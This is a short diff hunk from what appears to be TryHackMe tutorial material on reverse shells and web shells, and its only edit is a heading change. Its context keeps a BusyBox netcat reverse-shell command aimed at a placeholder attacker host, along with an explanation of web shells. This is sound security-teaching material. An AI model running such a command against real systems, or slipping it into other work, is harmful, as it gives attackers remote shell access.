@@ -287,7 +287,7 @@ target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
 This BusyBox reverse shell uses Netcat (`nc`) to connect to the attacker at `ATTACKER_IP:443`. Once connected, it executes `/bin/sh`, exposing the command line to the attacker.
 
 ---
-Web Shell
+# Web Shell
 
 A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.
 
